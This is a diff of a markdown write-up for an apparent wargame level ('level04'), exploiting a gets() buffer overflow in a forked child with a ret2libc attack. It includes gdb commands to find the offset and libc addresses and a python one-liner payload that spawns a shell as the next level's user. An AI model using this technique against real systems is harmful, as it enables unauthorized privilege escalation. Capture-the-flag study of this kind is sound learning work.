@@ -42,29 +42,21 @@ int main(int argc, const char **argv, const char **envp)
 ```
 
 ### Explanation
-
-This program creates a child process using fork().
-
+This program creates a child process using `fork()`.
 The parent process monitores the child process and prevents it to use `execve()` using `ptrace(PTRACE_PEEKUSER)`.
-
 The child process uses `get()` to fill the `buffer` without checking its size.
-
 The vulnerability is found in the child process where `get()` fills `buffer` without checking the number of characters `get()` can accept.
+This will enable us to make a buffer overflow and perform a `ret2libc` attack.
+This attack consists in overriding the `eip` copy with `system()` address and pass the `/bin/sh` string as parameter in order to open a shell terminal.
 
-This will enable us to make a buffer overflow and perform a **ret-to-libc** attack.
-
-This attack consists in overriding the `$eip` register with `system()` address and pass the `"/bin/sh"` string as parameter in order to open a shell terminal.
-
-
-**1.** First we are going to use: this command in gdb
+First we are going to use gdb command:
 
 ```bash
 (gdb) set follow-fork-mode child
 ```
 to follow every events happening in the child process instead of the parent process.
 
-
-**2.** We need to find the offset to override `$eip`, we put a breakpoint just behind `get()` and look for the padding to reach `$eip`
+Now we need to find the offset to override `eip` copy, we set a breakpoint just behind `get()` and look for the padding to reach `eip` copy.
 
 ```bash
 (gdb) b *0x08048763
@@ -79,8 +71,7 @@ Breakpoint 4, 0x08048763 in main ()
 0xffffd718:    0x41414141    0x42424242    0x42424242    0x42424242
 ```
 
-
-**3.** We find the address of both functions `system()`, `exit()` and the string `"/bin/sh"` to perform the attack.
+Then we find the address of both functions `system()`, `exit()` and the string `/bin/sh` to perform the attack.
 
 ```bash
 (gdb) p system
@@ -93,10 +84,7 @@ warning: Unable to access target memory at 0xf7fd3b74, halting search.
 1 pattern found.
 ```
 
-
 ## Step 2: Exploiting the Binary
-
-We perform the **ret-to-libc** and a make shell spawn with the rights of the user **level05**. 
 
 ```bash
 (python -c 'print ("A" * 156) + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe5\xeb\x70"[::-1] + "\xf7\xf8\x97\xec"[::-1]';cat) | ./level04
